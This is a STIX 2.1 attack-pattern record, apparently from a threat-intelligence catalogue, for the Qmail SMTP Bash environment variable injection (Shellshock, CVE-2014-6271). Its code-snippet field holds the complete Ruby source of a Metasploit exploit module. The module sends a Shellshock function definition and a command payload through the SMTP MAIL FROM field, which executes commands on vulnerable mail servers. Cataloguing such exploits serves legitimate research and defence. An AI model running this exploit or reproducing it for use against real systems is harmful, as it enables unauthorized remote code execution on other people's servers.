{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--760994a0-24c6-454c-afd3-9f04208c148b",
    "created": "2024-08-14T17:14:09.849388Z",
    "modified": "2024-08-14T17:14:09.849392Z",
    "name": "Qmail SMTP Bash Environment Variable Injection (Shellshock)",
    "description": " This module exploits a shellshock vulnerability on Qmail, a public domain MTA written in C that runs on Unix systems. Due to the lack of validation on the MAIL FROM field, it is possible to execute shell code on a system with a vulnerable BASH (Shellshock). This flaw works on the latest Qmail versions (qmail-1.03 and netqmail-1.06). However, in order to execute code, /bin/sh has to be linked to bash (usually default configuration) and a valid recipient must be set on the RCPT TO field (usually admin@exampledomain.com). The exploit does not work on the \"qmailrocks\" community version as it ensures the MAILFROM field is well-formed. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/smtp/qmail_bash_env_exec.rb",
            "external_id": "qmail_bash_env_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-6271"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/oss-sec/2014/q3/649"
        },
        {
            "source_name": "reference",
            "url": "https://lists.gt.net/qmail/users/138578"
        }
    ],
    "x_code_snippet": " ##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Smtp\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'Qmail SMTP Bash Environment Variable Injection (Shellshock)',\n      'Description'    => %q{\n        This module exploits a shellshock vulnerability on Qmail, a public\n        domain MTA written in C that runs on Unix systems.\n        Due to the lack of validation on the MAIL FROM field, it is possible to\n        execute shell code on a system with a vulnerable BASH (Shellshock).\n        This flaw works on the latest Qmail versions (qmail-1.03 and\n        netqmail-1.06).\n        However, in order to execute code, /bin/sh has to be linked to bash\n        (usually default configuration) and a valid recipient must be set on the\n        RCPT TO field (usually admin@exampledomain.com).\n        The exploit does not work on the \"qmailrocks\" community version\n        as it ensures the MAILFROM field is well-formed.\n      },\n      'Author'         =>\n        [\n          'Mario Ledo (Metasploit module)',\n          'Gabriel Follon (Metasploit module)',\n          'Kyle George (Vulnerability discovery)'\n        ],\n      'License'        => MSF_LICENSE,\n      'Platform'       => ['unix'],\n      'Arch'           => ARCH_CMD,\n      'References'     =>\n        [\n          ['CVE', '2014-6271'],\n          ['CWE', '94'],\n          ['OSVDB', '112004'],\n          ['EDB', '34765'],\n          ['URL', 'https://seclists.org/oss-sec/2014/q3/649'],\n          ['URL', 'https://lists.gt.net/qmail/users/138578']\n        ],\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x3e\",\n          'Space'       => 888,\n          'DisableNops' => true,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'generic telnet perl ruby python'\n              # telnet ruby python and perl works only if installed on target\n            }\n        },\n      'Targets'        => [ [ 'Automatic', { }] ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2014-09-24'\n    ))\n\n    deregister_options('MAILFROM')\n  end\n\n  def smtp_send(data = nil)\n    begin\n      result = ''\n      code = 0\n      sock.put(\"#{data}\")\n      result = sock.get_once\n      result.chomp! if (result)\n      code = result[0..2].to_i if result\n      return result, code\n    rescue Rex::ConnectionError, Errno::ECONNRESET, ::EOFError\n      return result, 0\n    rescue ::Exception => e\n      print_error(\"#{rhost}:#{rport} Error smtp_send: '#{e.class}' '#{e}'\")\n      return nil, 0\n    end\n  end\n\n  def exploit\n    to = datastore['MAILTO']\n    connect\n    result = smtp_send(\"HELO localhost\\r\\n\")\n    if result[1] < 200 || result[1] > 300\n      fail_with(Failure::Unknown, (result[1] != 0 ? result[0] : 'connection error'))\n    end\n    print_status('Sending the payload...')\n    result = smtp_send(\"mail from:<() { :; }; \" + payload.encoded.gsub!(/\\\\/, '\\\\\\\\\\\\\\\\') + \">\\r\\n\")\n    if result[1] < 200 || result[1] > 300\n      fail_with(Failure::Unknown, (result[1] != 0 ? result[0] : 'connection error'))\n    end\n    print_status(\"Sending RCPT TO #{to}\")\n    result = smtp_send(\"rcpt to:<#{to}>\\r\\n\")\n    if result[1] < 200 || result[1] > 300\n      fail_with(Failure::Unknown, (result[1] != 0 ? result[0] : 'connection error'))\n    end\n    result = smtp_send(\"data\\r\\n\")\n    if result[1] < 200 || result[1] > 354\n      fail_with(Failure::Unknown, (result[1] != 0 ? result[0] : 'connection error'))\n    end\n    result = smtp_send(\"data\\r\\n\\r\\nfoo\\r\\n\\r\\n.\\r\\n\")\n    if result[1] < 200 || result[1] > 300\n      fail_with(Failure::Unknown, (result[1] != 0 ? result[0] : 'connection error'))\n    end\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-09-24",
    "x_mitre_platforms": [
        "['unix']"
    ]
}